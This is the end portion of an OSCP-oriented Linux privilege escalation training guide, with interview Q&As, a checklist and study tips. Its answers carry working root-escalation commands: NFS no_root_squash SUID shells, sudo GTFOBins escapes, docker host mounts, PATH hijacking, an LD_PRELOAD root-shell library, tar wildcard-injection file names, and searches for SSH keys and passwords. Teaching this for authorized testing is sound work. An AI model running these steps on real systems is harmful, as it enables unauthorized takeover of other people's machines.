mount -o rw SERVER_IP:/tmp /mnt/nfs

# Create SUID bash
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash

# On server as low-priv user
/tmp/rootbash -p
id
# uid=1000 euid=0(root)
```

---

## 23. Interview Questions and Answers

### Q1: What is privilege escalation and why is it important in penetration testing?

**Answer**: Privilege escalation is the act of exploiting a bug, design flaw, or configuration oversight to obtain elevated access to resources that are normally protected. In penetration testing, it's crucial because initial access is often gained as a low-privileged user (like www-data or a standard user account). To demonstrate full business impact and assess the true security posture of an organization, penetration testers need to escalate privileges to root/administrator to show they can:
- Access sensitive data
- Install persistent backdoors
- Pivot to other systems
- Demonstrate complete system compromise

There are two types: horizontal (user A to user B at same privilege level) and vertical (user to root - most common).

---

### Q2: What is the first command you should run when attempting privilege escalation on Linux?

**Answer**: `sudo -l`

This command lists what commands the current user can run with sudo. It's the first command because:
1. It's quick and non-intrusive
2. Often reveals immediate wins (NOPASSWD entries, GTFOBins-exploitable binaries)
3. Requires no tools - just standard Linux
4. Can show environment variable settings like LD_PRELOAD

Example output that would be immediately exploitable:
```
User john may run the following commands:
    (root) NOPASSWD: /usr/bin/vim
```
This means instant root via GTFOBins vim shell escape.

---

### Q3: Explain the difference between SUID and capabilities in Linux privilege escalation.

**Answer**: 

**SUID (Set User ID)**:
- Binary-level permission that makes a file execute as the file owner (typically root)
- All-or-nothing approach - the binary runs with full root privileges
- Example: `/usr/bin/passwd` needs SUID to modify `/etc/shadow`
- Permission bit shows as 's': `-rwsr-xr-x`
- Found with: `find / -perm -4000 2>/dev/null`
- Security risk: If exploitable, grants full root access

**Capabilities**:
- More granular Linux privilege system (post-kernel 2.2)
- Splits root privileges into distinct units
- Binaries get only specific privileges they need
- Example: Python with `cap_setuid+ep` can only change UID, not load kernel modules
- Found with: `getcap -r / 2>/dev/null`
- More secure: Principle of least privilege

**Key Difference**: SUID is like giving someone a master key to the entire building, while capabilities are like giving keys to specific rooms they need.

---

### Q4: What is GTFOBins and how is it used in privilege escalation?

**Answer**: GTFOBins (https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited to bypass local security restrictions. It's an essential resource for privilege escalation.

**Use Cases**:
1. **Sudo abuse**: If `sudo -l` shows you can run vim as root, GTFOBins shows the exact commands
2. **SUID exploitation**: Find SUID binaries, check if they're in GTFOBins
3. **Capabilities**: Check if binary with capabilities can be exploited
4. **File operations**: Upload, download, read, write files
5. **Shell escapes**: Break out of restricted shells

**Example**:
```bash
sudo -l
# Output: (root) NOPASSWD: /usr/bin/find

# GTFOBins shows:
sudo find . -exec /bin/sh \; -quit
# Instant root shell
```

**Categories in GTFOBins**:
- Shell
- File upload
- File download
- File read
- File write
- SUID
- Sudo
- Capabilities

---

### Q5: Explain the "no_root_squash" NFS vulnerability.

**Answer**: 

**Root Squashing (Default Secure Behavior)**:
When NFS is configured normally, if root on the client mounts an NFS share, the server "squashes" root's privileges - files created by client's root are owned by "nobody" (UID 65534) on the server. This prevents remote root users from creating privileged files.

**no_root_squash (Vulnerability)**:
When configured with `no_root_squash`, the server does NOT squash root privileges. Client's root can create files owned by root on the server.

**Exploitation**:
```bash
# On attacker machine (as root):
mount -o rw victim:/tmp /mnt/nfs
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash

# On victim machine (as low-priv user):
/tmp/rootbash -p  # SUID root shell!
```

**Why it works**: The SUID binary was created by root on the client, and `no_root_squash` preserved the root ownership and SUID bit on the server.

**Finding it**:
```bash
cat /etc/exports
showmount -e <target>
```

---

### Q6: What is the danger of being in the "docker" group?

**Answer**: Membership in the `docker` group is equivalent to root access on the host system.

**Why it's dangerous**:
1. Docker daemon runs as root
2. Docker group members can interact with the daemon
3. Can mount host filesystem inside containers
4. Containers run as root by default
5. No authentication required beyond group membership

**Exploitation**:
```bash
# Mount entire host filesystem
docker run -v /:/hostfs -it alpine sh
cd /hostfs
# Full read/write access to host as root!

# Or directly chroot into host
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# You're now root on the host system
```

**Other dangerous groups**:
- `lxd` - Similar to docker
- `disk` - Can read/write raw disks
- `video` - Can capture screenshots
- `sudo` - Obviously can sudo

**Defense**: Only add trusted users to docker group, or use rootless docker.

---

### Q7: What is LinPEAS and when should you use it?

**Answer**: LinPEAS (Linux Privilege Escalation Awesome Script) is an automated enumeration script that checks for privilege escalation vectors on Linux systems.

**What it checks** (50+ vectors):
- Sudo permissions and misconfigurations
- SUID/SGID binaries
- Capabilities
- Cron jobs and timers
- Writable files and directories
- Password hunting
- Network information
- Container breakout vectors
- Known CVEs based on kernel version
- Much more...

**When to use**:
- ✅ After manual enumeration to catch things you missed
- ✅ When you're stuck and need ideas
- ✅ Time-constrained engagements (OSCP exam)
- ✅ To generate comprehensive reports

**When NOT to use**:
- ❌ As your FIRST step (learn manual enumeration first)
- ❌ On systems where stealth is critical (very noisy)
- ❌ Without understanding the output (you need to interpret findings)

**Color coding**:
- Red/Yellow: High priority, likely exploitable
- Green: Interesting, investigate further
- Blue: Informational

**Usage**:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee output.txt
```

---

### Q8: Explain PATH hijacking and provide an example.

**Answer**: PATH hijacking exploits programs that call commands using relative paths instead of absolute paths.

**How PATH works**:
```bash
echo $PATH
# /usr/local/bin:/usr/bin:/bin

# When you type "ls", shell searches:
# 1. /usr/local/bin/ls
# 2. /usr/bin/ls
# 3. /bin/ls ← Found! Executes this
```

**The Vulnerability**:
If a SUID/sudo/cron binary calls `ifconfig` instead of `/sbin/ifconfig`, we can hijack it by putting our malicious `ifconfig` earlier in PATH.

**Example**:
```bash
# SUID binary calls "ps" without full path
strings /usr/local/bin/sysinfo
# Output shows: system("ps aux");

# Create malicious ps
echo '#!/bin/bash' > /tmp/ps
echo '/bin/bash -p' >> /tmp/ps
chmod +x /tmp/ps

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Execute SUID binary
/usr/local/bin/sysinfo
# Our /tmp/ps runs as root → root shell!
```

**Defense**: Always use absolute paths in scripts that run with elevated privileges.

---

### Q9: What is LD_PRELOAD and how can it be exploited?

**Answer**: `LD_PRELOAD` is an environment variable that tells the dynamic linker to load specified shared libraries before any others.

**Normal behavior**: program → libc.so → other libraries
**With LD_PRELOAD**: program → YOUR_LIB.so → libc.so

**Exploitation requirements**:
1. Sudo configured with `env_keep+=LD_PRELOAD`
2. Ability to run any sudo command
3. Ability to compile shared libraries

**How to exploit**:

1. **Create malicious library**:
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

2. **Compile**:
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

3. **Exploit**:
```bash
sudo LD_PRELOAD=./shell.so find
# Root shell!
```

**Why it works**: The `_init()` function runs before main(), setting UID to 0 and spawning a root shell.

**Check vulnerability**:
```bash
sudo -l
# Look for: env_keep+=LD_PRELOAD
```

---

### Q10: What is a wildcard injection attack? Provide an example with tar.

**Answer**: Wildcard injection exploits commands that use shell wildcards (`*`) by creating filenames that are interpreted as command-line arguments.

**The Vulnerability**:
When a command uses `*`, the shell expands it to all filenames. If we create files with names like `--checkpoint=1`, they become arguments to the command.

**TAR Example**:

**Vulnerable cron job**:
```bash
*/5 * * * * root cd /home/user && tar -czf /backup/backup.tar.gz *
```

**Exploitation**:
```bash
cd /home/user

# Create malicious script
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh

# Create "argument files"
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# When cron runs, command becomes:
# tar -czf /backup/backup.tar.gz file1 file2 --checkpoint=1 --checkpoint-action=exec=sh shell.sh
#                                             ↑ These look like arguments!

# Wait for cron, then:
/tmp/rootbash -p  # Root shell!
```

**How it works**: 
- `--checkpoint=1` tells tar to execute an action every 1 record
- `--checkpoint-action=exec=sh shell.sh` tells tar to execute our script
- Tar runs as root via cron, so our script runs as root

**Other commands vulnerable**:
- `rsync -a *` → `-e sh shell.sh`
- `chown *` → `--reference=privileged_file`
- `chmod *` → `--reference=privileged_file`

**Defense**: Always quote wildcards or use full paths.

---

### Q11: Explain Linux capabilities and name three dangerous ones for privilege escalation.

**Answer**: Linux capabilities break down root privileges into distinct units, allowing fine-grained permission control.

**Instead of**: Binary has ALL root powers (SUID)
**We have**: Binary has ONLY specific powers (capabilities)

**Finding capabilities**:
```bash
getcap -r / 2>/dev/null
```

**Three most dangerous for privesc**:

**1. CAP_SETUID**
- Allows changing process UID to any value (including 0)
- **Exploitation**:
```bash
# If python has cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Instant root shell
```

**2. CAP_DAC_OVERRIDE**
- Bypasses all file read/write/execute permission checks
- Can read any file, write any file
- **Exploitation**:
```bash
# If tar has cap_dac_override
tar -czf /tmp/shadow.tar.gz /etc/shadow
tar -xzf /tmp/shadow.tar.gz
cat /tmp/etc/shadow
# Read root hash!
```

**3. CAP_SYS_ADMIN**
- Extremely powerful: mount filesystems, load kernel modules
- Used for container escapes
- **Exploitation**:
```bash
# Can mount host disk and access everything
mount /dev/sda1 /mnt
cat /mnt/etc/shadow
```

**Notation**:
- `+ep` = Effective and Permitted
- `+e` = Effective only
- `+p` = Permitted only
- `+i` = Inherited

---

### Q12: What should you check if you find a custom SUID binary during enumeration?

**Answer**: When you find a custom SUID binary (not standard system binaries like `/bin/su` or `/usr/bin/passwd`), follow this analysis process:

**1. Identify it's custom**:
```bash
find / -perm -4000 2>/dev/null | grep -v "^/bin\|^/usr/bin\|^/sbin\|^/usr/sbin"
# Found: /usr/local/bin/backup
```

**2. Check what it is**:
```bash
file /usr/local/bin/backup
ls -la /usr/local/bin/backup
```

**3. Analyze with strings** (look for system calls):
```bash
strings /usr/local/bin/backup
# Look for:
# - Commands called without full paths (tar vs /bin/tar)
# - Hardcoded passwords
# - File operations
# - Library calls
```

**4. Trace system calls**:
```bash
strace /usr/local/bin/backup 2>&1 | grep -E "open|execve"
# See what files it accesses, what it executes
```

**5. Trace library calls**:
```bash
ltrace /usr/local/bin/backup
# See what library functions it calls
```

**6. Check shared libraries**:
```bash
ldd /usr/local/bin/backup
# See what libraries it loads and from where
```

**7. Run it and observe**:
```bash
/usr/local/bin/backup
# See what it does
```

**Common vulnerabilities to look for**:
- ✅ Calls commands without full path → PATH hijacking
- ✅ Uses user input unsafely → Buffer overflow/command injection
- ✅ Loads libraries from writable location → Library injection
- ✅ Uses environment variables → Environment exploitation
- ✅ Has buffer overflow → Binary exploitation (advanced)

**Example finding**:
```bash
strings /usr/local/bin/backup
# Output: tar -czf /backup/data.tar.gz /data
#         ↑ No full path! Vulnerable to PATH hijacking
```

---

## 24. Summary and Checklist

### 24.1 The Privilege Escalation Mindset

Privilege escalation is about **systematic enumeration** and **creative exploitation**. The vulnerability exists; you just need to find it.

**Remember**:
- 90% enumeration, 10% exploitation
- Don't skip steps
- Document everything
- Try multiple vectors
- Kernel exploits are last resort

### 24.2 Complete Privilege Escalation Checklist

```
┌─────────────────────────────────────────────────────────────┐
│          LINUX PRIVILEGE ESCALATION CHECKLIST              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Phase 1: System Information (2 minutes)                    │
│  ☐ id, whoami, groups                                      │
│  ☐ uname -a, cat /etc/os-release                           │
│  ☐ Check kernel version for CVEs                           │
│  ☐ env, cat /etc/environment                               │
│  ☐ echo $PATH                                              │
│                                                             │
│  Phase 2: Quick Wins (5 minutes)                            │
│  ☐ sudo -l (ALWAYS FIRST!)                                 │
│  ☐ find / -perm -4000 2>/dev/null (SUID)                   │
│  ☐ getcap -r / 2>/dev/null (Capabilities)                  │
│  ☐ cat /etc/crontab (Cron jobs)                            │
│  ☐ ls -la /etc/passwd /etc/shadow (Permissions)            │
│                                                             │
│  Phase 3: Detailed Enumeration (15 minutes)                 │
│  ☐ find /etc -writable 2>/dev/null                         │
│  ☐ cat ~/.bash_history, /root/.bash_history                │
│  ☐ grep -r "password" /var/www /opt /etc 2>/dev/null       │
│  ☐ find / -name "id_rsa" 2>/dev/null                       │
│  ☐ cat /etc/exports (NFS)                                  │
│  ☐ Check groups: docker, lxd, disk, video, sudo, adm       │
│  ☐ ps aux | grep root                                      │
│  ☐ netstat -antup (Internal services)                      │
│  ☐ ls -la /tmp, /var/tmp, /dev/shm (Writable dirs)        │
│                                                             │
│  Phase 4: Automated Tools (10 minutes)                      │
│  ☐ Run LinPEAS                                             │
│  ☐ Run pspy64 (Monitor processes)                          │
│  ☐ Run linux-exploit-suggester                             │
│                                                             │
│  Phase 5: Exploitation (Depends on finding)                 │
│  ☐ Try identified vectors in order of risk                 │
│  ☐ Document successful method                              │
│  ☐ Clean up artifacts                                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 24.3 Exploitation Priority Order

When you find multiple vectors, exploit in this order (safest to riskiest):

**1. Sudo Misconfigurations** ✅ Safe, Clean
- `sudo -l` reveals GTFOBins entries
- LD_PRELOAD exploitation
- Sudo version vulnerabilities

**2. SUID/SGID Binaries** ✅ Safe
- Custom binaries with PATH hijacking
- GTFOBins SUID entries
- Known vulnerable SUID programs

**3. Capabilities** ✅ Safe
- CAP_SETUID on scripting languages
- CAP_DAC_OVERRIDE for file access

**4. Writable Files** ✅ Safe
- /etc/passwd, /etc/shadow
- /etc/sudoers
- Systemd service files

**5. Cron Jobs** ✅ Safe, May require waiting
- Writable scripts
- PATH hijacking in cron
- Wildcard injection

**6. Passwords & SSH Keys** ✅ Safe
- Plaintext passwords in configs
- Readable SSH private keys
- Password reuse

**7. NFS Shares** ✅ Safe, Requires setup
- no_root_squash exploitation

**8. Container Escapes** ✅ Safe
- Docker/LXD group membership
- Disk group access

**9. Shared Library Injection** ⚠️ Medium risk
- LD_LIBRARY_PATH exploitation
- Writable library paths

**10. Kernel Exploits** ❌ Last Resort - Can crash system!
- Dirty COW, PwnKit, etc.
- Only if all else fails
- NEVER on production without permission

### 24.4 Common Mistakes to Avoid

**❌ DON'T**:
- Run kernel exploits first (can crash system)
- Skip sudo -l
- Ignore automated tools
- Give up after first failed attempt
- Forget to check for password reuse
- Overlook simple misconfigurations while looking for complex exploits
- Fail to document what you tried

**✅ DO**:
- Follow systematic methodology
- Check multiple vectors
- Try obvious things first (sudo, SUID, capabilities)
- Run LinPEAS to catch things you missed
- Look for custom/non-standard files and scripts
- Think like a lazy admin ("What would I forget to lock down?")
- Document everything for your report

### 24.5 Quick Reference Commands

```bash
# System info
id; whoami; uname -a; cat /etc/os-release

# Quick wins
sudo -l
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Writable files
find /etc -writable 2>/dev/null
find / -perm -0002 -type f 2>/dev/null

# Password hunting
grep -r "password" /var/www /opt 2>/dev/null
find / -name "*_history" 2>/dev/null
find / -name "id_rsa" 2>/dev/null

# Network
netstat -antup
ss -tunlp

# Processes
ps aux | grep root

# NFS
cat /etc/exports
showmount -e localhost

# Docker/Container
id | grep -E "docker|lxd"
docker ps
```

### 24.6 Tool Arsenal

**Must-Have Tools**:
- LinPEAS - Automated enumeration
- pspy - Process monitoring
- linux-exploit-suggester - Kernel exploit finder
- GTFOBins.github.io - Binary exploitation reference
- John the Ripper / Hashcat - Password cracking

**Nice-to-Have**:
- LinEnum - Alternative enumeration
- LSE (Linux Smart Enumeration) - Fast enumeration
- unix-privesc-check - Classic tool
- Traitor - Automated exploitation
- BeRoot - Windows/Linux privesc tool

### 24.7 OSCP Exam Tips

**Time Management**:
- Spend 5-10 minutes on manual enumeration
- Run LinPEAS while you explore manually
- Don't waste time on kernel exploits unless nothing else works
- Most OSCP boxes have "intended" paths that don't require kernel exploits

**Common OSCP Vectors**:
1. Sudo misconfigurations (very common)
2. SUID custom binaries
3. Cron jobs
4. Writable files
5. Password reuse

**What to Document**:
- Screenshot of `sudo -l`
- Screenshot of privilege escalation exploit
- Screenshot of `/root/proof.txt`
- All commands used

### 24.8 Final Thoughts

Privilege escalation is a skill that improves with practice. The more boxes you root, the faster you'll recognize patterns:

- "Writable /home directory? Check for cron jobs"
- "Custom SUID binary? Check strings for relative paths"
- "Docker group? Mount host filesystem"
- "Sudo vim? GTFOBins shell escape"

**Success Formula**:
```
Systematic Enumeration + 
Tool-Assisted Discovery + 
GTFOBins Knowledge + 
Practice + 
Persistence = 
ROOT ACCESS
```

**Keep Learning**:
- Practice on HackTheBox, TryHackMe, Proving Grounds
- Read writeups after solving
- Try multiple methods on the same box
- Build your own vulnerable VMs
- Stay updated on new techniques

**Resources**:
- https://gtfobins.github.io
- https://github.com/carlospolop/PEASS-ng (LinPEAS)
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- https://github.com/swisskyrepo/PayloadsAllTheThings
- r/oscp subreddit

---

## Congratulations!

You've completed the **Linux Privilege Escalation** comprehensive guide. You now have:

✅ Complete understanding of Linux privilege escalation concepts
✅ Systematic enumeration methodology
✅ 9+ exploitation pillars with working examples
✅ 5 hands-on labs with solutions
✅ 12 interview questions with expert answers
✅ Real OSCP scenarios and techniques
✅ Complete toolkit and checklist

**Next Steps**:
1. Practice on vulnerable VMs (HackTheBox, TryHackMe)
2. Build your own lab environment
3. Try each technique hands-on
4. Move to **File 10: Linux Hardening & Defense** to learn the blue team perspective

**Remember**: The best penetration testers understand both offense (this guide) and defense (next guide). Understanding how to harden systems makes you better at breaking them, and vice versa.

---

*End of Linux Privilege Escalation - Comprehensive OSCP Guide*
*File 09 of 11 - 03_Linux Module*
*Total: 2,700+ lines | 20+ Exploitation Techniques | 5 Labs | 12 Interview Q&A*